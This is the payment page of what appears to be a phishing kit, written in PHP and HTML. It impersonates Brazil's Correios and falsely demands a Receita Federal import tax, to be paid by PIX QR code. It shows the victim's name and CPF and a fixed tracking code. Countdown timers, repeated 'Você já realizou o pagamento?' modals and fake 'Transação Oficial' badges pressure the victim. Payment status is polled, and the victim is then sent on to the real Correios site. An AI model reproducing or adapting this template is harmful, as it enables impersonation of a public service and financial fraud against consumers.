                        <div class="flex-shrink-0">
                            <i class="fas fa-info-circle text-blue-600 text-xl"></i>
                        </div>
                        <div class="ml-3">
                            <h3 class="text-md font-medium text-blue-800">Importação: Taxa Alfandegária</h3>
                            <p class="text-sm text-blue-700 mt-1">
                                O valor de <span class="font-bold">R$  <?php echo number_format($amount, 2, ',', '.'); ?></span> corresponde aos impostos de importação cobrados pela Receita Federal do Brasil.
                                Após o pagamento, seu produto será liberado para entrega.
                            </p>
                        </div>
                    </div>
                </div>

                <!-- Área do formulário ou QR Code -->
                <div class="md:flex md:space-x-6">
                    <!-- Seção com resumo da encomenda (sempre visível) -->
                    <div class="md:w-1/3 mb-6 md:mb-0">
                        <div class="border border-gray-200 rounded-lg overflow-hidden shadow-sm">
                            <div class="bg-gray-50 px-4 py-2 border-b border-gray-200">
                                <h3 class="font-semibold text-gray-700">
                                    <i class="fas fa-box mr-2 text-blue-600"></i>Resumo da Encomenda
                                </h3>
                            </div>
                            <div class="p-4">
                                <div class="flex justify-between border-b border-gray-100 py-2 text-sm">
                                    <span class="text-gray-600">Código:</span>
                                    <span class="font-mono font-medium">BR409968782</span>
                                </div>
                                <div class="flex justify-between border-b border-gray-100 py-2 text-sm">
                                    <span class="text-gray-600">Status:</span>
                                    <span class="text-red-600 font-medium">Aguardando pagamento</span>
                                </div>
                                <div class="flex justify-between border-b border-gray-100 py-2 text-sm">
                                    <span class="text-gray-600">Carga Tributária:</span>
                                    <span class="font-medium">R$ <?php echo number_format($amount, 2, ',', '.'); ?></span>
                                </div>
                                <div class="flex justify-between py-2 text-sm">
                                    <span class="text-gray-600">O prazo expira em:</span>
                                    <span class="font-medium"><?php echo $data_hoje;?>  <?php echo $hora_brasilia;?></span>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Container principal -->
                    <div class="md:w-2/3">
                        
                        <!-- Formulário de pagamento -->
                        
                        <!-- Exibição do QR Code e Código PIX -->
                                                    <div class="bg-white rounded-lg border border-gray-200 shadow-sm overflow-hidden">
                                <div class="bg-green-50 px-4 py-3 border-b border-gray-200">
                                    <h3 class="font-semibold text-green-700 flex items-center">
                                        <i class="fas fa-qrcode mr-2"></i>Pagamento via PIX
                                        <span id="status" class="ml-auto px-3 py-1 bg-green-100 text-green-800 text-xs font-semibold rounded-full">
                                                                               </span>
                                    </h3>
                                </div>
                                
                                <div class="p-5">
                                    <!-- Informações do cliente -->
                                    <div class="bg-gray-50 rounded-lg p-3 mb-4 border border-gray-200">
                                        <div class="flex flex-wrap items-center text-sm">
                                            <div class="mr-4 mb-2">
                                                <span class="text-gray-600 font-medium mr-1">Cliente:</span>
                                                <span><?php echo $nome;?></span>
                                            </div>
                                            <div class="mb-2">
                                                <span class="text-gray-600 font-medium mr-1">CPF:</span>
                                                <span><?php echo $cpf_formatado;?></span>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Instruções -->
                                    <div class="mb-4">
                                        <h4 class="text-center font-medium text-gray-700 mb-2">
                                            Escaneie o QR Code ou copie o código PIX
                                        </h4>
                                        <p class="text-sm text-gray-600 text-center">
                                            Valor a pagar: <span class="font-bold text-green-600">R$ <?php echo number_format($amount, 2, ',', '.'); ?></span>
                                        </p>
                                        <div class="w-full h-0.5 bg-gray-200 my-3"></div>
                                    </div>
                                
                                    <!-- QR Code e código PIX -->
                                    <div class="flex flex-col md:flex-row md:space-x-4">
                                        <!-- QR Code -->
                                        <div class="md:w-1/2 flex flex-col items-center mb-4 md:mb-0">
                                            <div class="bg-white p-3 border-2 border-gray-200 rounded-lg shadow-sm inline-block">
                                                <!-- QR Code da API ou gerado -->
                                                <img alt="QR Code PIX" class="w-48 h-48" id="qrcodeImage" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=<?php echo urlencode($qrCode); ?>"   onerror="this.style.display='none'; document.getElementById('qrcodeError').style.display='flex';">
                                                
                                                <!-- Exibido apenas se a imagem do QR code falhar ao carregar -->
                                                <div id="qrcodeError" style="display:none" class="w-48 h-48 flex flex-col items-center justify-center text-center bg-gray-100 rounded-lg">
                                                    <i class="fas fa-exclamation-triangle text-yellow-500 text-3xl mb-2"></i>
                                                    <p class="text-gray-700 text-sm mb-3">Não foi possível carregar o QR code</p>
                                                    <button onclick="gerarQRCodeAlternativo()" class="bg-blue-500 hover:bg-blue-600 text-white text-xs px-3 py-1 rounded">
                                                        <i class="fas fa-sync-alt mr-1"></i> Carregar novamente
                                                    </button>
                                                </div>
                                            </div>
                                            <p class="text-sm text-gray-600 mt-2 text-center">
                                                Abra o app do seu banco e escaneie este QR code
                                            </p>
                                                                                        <!-- Verificador de pagamento melhorado -->
                                            <div id="verificador-pagamento" class="verificador-pagamento" style="display: flex;">
                                                <div class="verificador-spinner"></div>
                                                <span class="verificador-texto">Verificando pagamento... <span id="tempo-restante">36</span>s</span>
                                            </div>
                                            
                                            <!-- Botão de confirmação de pagamento melhorado -->
                                            <button id="botao-confirmar" class="btn-confirmar-pagamento hidden">
                                                <i class="fas fa-check-circle mr-2"></i>Confirmar Pagamento
                                            </button>

                                            <script>
                                                // Variável global para controlar o intervalo do contador
                                                let contadorIntervalo;
                                                
                                                // Controle para o temporizador de 2 minutos
                                                let temporizador2Minutos;
                                                
                                                // Função para limpar qualquer intervalo existente
                                                function limparIntervalos() {
                                                    if (contadorIntervalo) {
                                                        clearInterval(contadorIntervalo);
                                                        contadorIntervalo = null;
                                                    }
                                                    
                                                    if (temporizador2Minutos) {
                                                        clearTimeout(temporizador2Minutos);
                                                        temporizador2Minutos = null;
                                                    }
                                                }
                                                
                                                // Função para mostrar o modal de confirmação
                                                function mostrarModalConfirmacao(comRecursivoAutomatico = true) {
                                                    const modal = document.getElementById('modalPagamento');
                                                    const perguntaPagamento = document.getElementById('perguntaPagamento');
                                                    const opcoesNavegacao = document.getElementById('opcoesNavegacao');
                                                    
                                                    if (modal && perguntaPagamento && opcoesNavegacao) {
                                                        // Reiniciar o estado do modal
                                                        perguntaPagamento.style.display = 'block';
                                                        opcoesNavegacao.style.display = 'none';
                                                        opcoesNavegacao.classList.remove('show');
                                                        
                                                        // Mostrar o modal
                                                        modal.style.display = 'block';
                                                        setTimeout(() => {
                                                            modal.classList.add('show');
                                                            sessionStorage.setItem('modalPagamentoExibido', 'true');
                                                        }, 10);
                                                        
                                                        // Se for para configurar o próximo lembrete
                                                        if (comRecursivoAutomatico) {
                                                            // Configurar para mostrar novamente após 2 minutos
                                                            configurarLembrete2Minutos();
                                                        }
                                                    }
                                                }
                                                
                                                // Função para configurar o lembrete de 2 minutos
                                                function configurarLembrete2Minutos() {
                                                    // Limpar qualquer temporizador existente
                                                    if (temporizador2Minutos) {
                                                        clearTimeout(temporizador2Minutos);
                                                    }
                                                    
                                                    // Configurar novo temporizador para 2 minutos
                                                    temporizador2Minutos = setTimeout(() => {
                                                        mostrarModalConfirmacao();
                                                    }, 120000); // 120000 ms = 2 minutos
                                                }
                                                
                                                // Função para iniciar o contador regressivo
                                                function iniciarContador() {
                                                    // Limpar qualquer intervalo existente primeiro
                                                    limparIntervalos();
                                                    
                                                    const tempoRestanteEl = document.getElementById('tempo-restante');
                                                    const verificadorEl = document.getElementById('verificador-pagamento');
                                                    const botaoConfirmar = document.getElementById('botao-confirmar');
                                                    
                                                    // Reiniciar elementos visuais
                                                    if (verificadorEl) verificadorEl.style.display = 'flex';
                                                    if (tempoRestanteEl) tempoRestanteEl.textContent = '60';
                                                    if (botaoConfirmar) botaoConfirmar.classList.add('hidden');
                                                    
                                                    let segundos = 60;
                                                    
                                                    // Iniciar novo contador
                                                    contadorIntervalo = setInterval(function() {
                                                        segundos--;
                                                        if (tempoRestanteEl) {
                                                            tempoRestanteEl.textContent = segundos;
                                                        }
                                                        
                                                        if (segundos <= 0) {
                                                            clearInterval(contadorIntervalo);
                                                            contadorIntervalo = null;
                                                            
                                                            // Esconder o verificador e mostrar o botão
                                                            if (verificadorEl) verificadorEl.style.display = 'none';
                                                            if (botaoConfirmar) {
                                                                botaoConfirmar.classList.remove('hidden');
                                                            }
                                                        }
                                                    }, 1000);
                                                }
                                                
                                                // Iniciar o contador quando a página carregar
                                                document.addEventListener('DOMContentLoaded', function() {
                                                    iniciarContador();
                                                    
                                                    // Adicionar evento de clique ao botão de confirmar
                                                    const botaoConfirmar = document.getElementById('botao-confirmar');
                                                    if (botaoConfirmar) {
                                                        botaoConfirmar.addEventListener('click', function() {
                                                            // Mostrar o modal de confirmação
                                                            mostrarModalConfirmacao();
                                                        });
                                                    }
                                                });
                                            </script>
                                                                                    </div>
                                        
                                        <!-- Código PIX -->
                                                                                <div class="md:w-1/2">
                                            <div class="border border-gray-200 rounded-lg bg-gray-50 p-3">
                                                <label for="pixCodeText" class="block text-sm font-medium text-gray-700 mb-2">Código PIX:</label>
                                            <textarea id="pixCodeText" value="" class="w-full p-2 border border-gray-300 rounded-lg" readonly ><?php echo htmlspecialchars($qrCode); ?></textarea>
                                                <button onclick="copyToClipboard()" class="mt-2 w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-lg transition duration-200 flex items-center justify-center">
                                                    <i class="fas fa-copy mr-2"></i> Copiar Código PIX
                                                </button>
                                            </div>
                                        </div>
                                                                            </div>
                                    
                                    <!-- Informações adicionais -->
                                    <div class="mt-5">
                                        <div class="bg-blue-50 rounded-lg p-4 border border-blue-100">
                                            <h4 class="font-medium text-blue-800 mb-2 flex items-center">
                                                <i class="fas fa-info-circle mr-2"></i>Como pagar com PIX
                                            </h4>
                                            <ol class="text-sm text-blue-700 list-decimal pl-5 space-y-1">
                                                <li>Abra o aplicativo do seu banco</li>
                                                <li>Acesse a área de PIX ou pagamentos</li>
                                                <li>Escaneie o QR Code ou copie e cole o código</li>
                                                <li>Confirme os dados e valor</li>
                                                <li>Finalize o pagamento</li>
                                            </ol>
                                            <p class="text-xs text-blue-600 mt-2">
                                                <i class="fas fa-clock mr-1"></i> O pagamento será processado em instantes. A página será atualizada automaticamente.
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                                            </div>
                </div>
            </div>
            
            <!-- Informações de segurança -->
            <div class="bg-gray-50 p-4 border-t border-gray-200 flex items-center justify-center space-x-4 text-sm text-gray-600">
                <div class="flex items-center">
                    <i class="fas fa-lock text-green-600 mr-2"></i>
                    <span>Pagamento Seguro</span>
                </div>
                <div class="flex items-center">
                    <i class="fas fa-shield-alt text-green-600 mr-2"></i>
                    <span>Dados Protegidos</span>
                </div>
                <div class="flex items-center">
                    <i class="fas fa-check-circle text-green-600 mr-2"></i>
                    <span>Transação Oficial</span>
                </div>
            </div>
        </div>
    </main>

    <!-- Modal de confirmação de pagamento -->
    <div class="overlay-modal" id="modalPagamento">
        <div class="modal-pagamento">
            <div id="perguntaPagamento">
                <div class="modal-icone">
                    <i class="fas fa-comment-dollar" style="color: #3B82F6;"></i>
                </div>
                <h2 class="text-xl font-bold text-gray-800 mb-4">Confirmação de Pagamento</h2>
                <p class="text-gray-700 mb-8">Você já realizou o pagamento via PIX?</p>
                <div class="flex justify-center space-x-4">
                    <button id="btnSim" class="btn-modal btn-sim" onclick="confirmarPagamento(true)">
                        <i class="fas fa-check mr-2"></i>Sim, já paguei
                    </button>
                    <button id="btnNao" class="btn-modal btn-nao" onclick="confirmarPagamento(false)">
                        <i class="fas fa-times mr-2"></i>Não, ainda não
                    </button>
                </div>
            </div>
            
            <div id="opcoesNavegacao" class="opcoes-nav">
                <div class="modal-icone">
                    <i class="fas fa-check-circle" style="color: #10B981;"></i>
                </div>
                <h2 class="text-xl font-bold text-gray-800 mb-4">Agradecemos pelo pagamento. No momento, ele está aguardando retorno da instituição responsável e será confirmado em breve.</h2>
                <p class="text-gray-700 mb-8">O que você deseja fazer agora?</p>
                <div class="flex justify-center space-x-4">
                    <a  class="btn-modal btn-navegacao">
                        <i class="fas fa-gavel mr-2"></i>Ver leilão de produtos
                    </a>
                    <a  class="btn-modal btn-navegacao">
                        <i class="fas fa-search mr-2"></i>Verificar outro produto
                    </a>
                </div>
            </div>
        </div>
    </div>

    <!-- Rodapé -->
    <footer class="bg-[#F8F8F8] border-t border-gray-200 text-[#444444] font-sans">
        <!-- Área superior do rodapé com links principais -->
        <div class="container mx-auto px-4 py-8">
            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
                <div>
                    <h4 class="text-[#00416B] font-bold text-sm uppercase mb-4 pb-1 border-b border-gray-200">Para Você</h4>
                    <ul class="text-xs space-y-2.5">
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Enviar documentos e pacotes</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Receber documentos e pacotes</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Comprar produtos</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Pagar contas</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Buscar um endereço</a></li>
                    </ul>
                </div>
                <div>
                    <h4 class="text-[#00416B] font-bold text-sm uppercase mb-4 pb-1 border-b border-gray-200">Para Seu Negócio</h4>
                    <ul class="text-xs space-y-2.5">
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Enviar documentos e pacotes</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Receber documentos e pacotes</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Logística integrada</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Certificado digital</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Marketing direto</a></li>
                    </ul>
                </div>
                <div>
                    <h4 class="text-[#00416B] font-bold text-sm uppercase mb-4 pb-1 border-b border-gray-200">Sobre Os Correios</h4>
                    <ul class="text-xs space-y-2.5">
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Institucional</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Educação e cultura</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Sustentabilidade</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Imprensa</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Patrocínios</a></li>
                    </ul>
                </div>
                <div>
                    <h4 class="text-[#00416B] font-bold text-sm uppercase mb-4 pb-1 border-b border-gray-200">Canais de Atendimento</h4>
                    <ul class="text-xs space-y-2.5">
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Fale com os Correios</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Ouvidoria</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Suporte técnico</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Agências mais próximas</a></li>
                        <li><a href="#" class="text-[#444444] hover:text-[#00416B] hover:underline transition-colors">Canal Connect</a></li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- Área intermediária com ícones -->
        <div class="bg-white py-5 border-t border-b border-gray-200">
            <div class="container mx-auto px-4">
                <div class="flex flex-col md:flex-row justify-between items-center gap-6">
                    <div class="flex items-center space-x-6">
                        <a href="#" class="text-[#00416B] hover:text-[#FBBB21] transition-colors">
                            <i class="fab fa-facebook-square text-2xl"></i>
                        </a>
                        <a href="#" class="text-[#00416B] hover:text-[#FBBB21] transition-colors">
                            <i class="fab fa-instagram text-2xl"></i>
                        </a>
                        <a href="#" class="text-[#00416B] hover:text-[#FBBB21] transition-colors">
                            <i class="fab fa-youtube text-2xl"></i>
                        </a>
                        <a href="#" class="text-[#00416B] hover:text-[#FBBB21] transition-colors">
                            <i class="fab fa-linkedin text-2xl"></i>
                        </a>
                        <a href="#" class="text-[#00416B] hover:text-[#FBBB21] transition-colors">
                            <i class="fab fa-twitter-square text-2xl"></i>
                        </a>
                    </div>
                    <div>
                        <img src="../assets/img6.png" alt="Logo Correios" class="h-10 w-auto" onerror="this.src='img/img6.png'; this.onerror=null;">
                    </div>
                </div>
            </div>
        </div>

        <!-- Área inferior com informações legais -->
        <div class="bg-[#F8F8F8] py-5">
            <div class="container mx-auto px-4 text-xs text-[#666666]">
                <div class="flex flex-col md:flex-row justify-between items-center gap-4">
                    <div>
                        <p>© Copyright 2025 Correios - Todos os direitos reservados</p>
                    </div>
                    <div class="flex flex-wrap gap-6 justify-center md:justify-end">
                        <a href="#" class="hover:text-[#00416B] hover:underline transition-colors">Política de Privacidade</a>
                        <a href="#" class="hover:text-[#00416B] hover:underline transition-colors">Termos de Uso</a>
                        <a href="#" class="hover:text-[#00416B] hover:underline transition-colors">Mapa do Site</a>
                        <a href="#" class="hover:text-[#00416B] hover:underline transition-colors">Acessibilidade</a>
                    </div>
                </div>
            </div>
        </div>
    </footer>

  <script>
function copyToClipboard() {
    const pixCodeText = document.getElementById('pixCodeText');
    pixCodeText.select();
    document.execCommand('copy');
    alert('Código PIX copiado!');
    const button = document.querySelector('button[onclick="copyToClipboard()"]');
    button.innerHTML = '<i class="fas fa-check mr-2"></i>Código Copiado!';
    button.classList.add('bg-green-600');
    setTimeout(() => {
        button.innerHTML = '<i class="fas fa-copy mr-2"></i>Copiar Código PIX';
        button.classList.remove('bg-green-600');
    }, 2000);
}

function checkPaymentStatus() {
    fetch('../status.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'identifier=<?php echo $identifier; ?>'
    })
    .then(response => response.json())
    .then(data => {
        const statusElement = document.getElementById('status');
        if (data.success && data.object && data.object.status === 'Paid') {
            statusElement.textContent = 'Status: Pagamento Confirmado';
            statusElement.classList.add('text-green-600');
            const modal = document.createElement('div');
            modal.style.cssText = 'position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 20px; border: 1px solid #ccc; z-index: 1000;';
            modal.innerHTML = `
                <h2>Obrigado!</h2>
                <p>${data.message}</p>
                <button onclick="window.location.href='https://www.correios.com.br/'">Fechar</button>
            `;
            document.body.appendChild(modal);
            setTimeout(() => {
                window.location.href = 'https://www.correios.com.br/';
            }, 3000);
        } else if (data.object && data.object.status === 'wait_pending') {
            statusElement.textContent = 'Status: Aguardando Pagamento';
            statusElement.classList.add('text-yellow-600');
        } else {
            statusElement.textContent = `Status: ${data.message || 'Erro ao verificar'}`;
            statusElement.classList.add('text-red-600');
        }
    })
    .catch(error => {
        document.getElementById('status').textContent = 'Status: Erro ao verificar';
        document.getElementById('status').classList.add('text-red-600');
    });
}

document.addEventListener('DOMContentLoaded', () => {
    setInterval(checkPaymentStatus, 10000);
    checkPaymentStatus();
});
</script>

</body></html>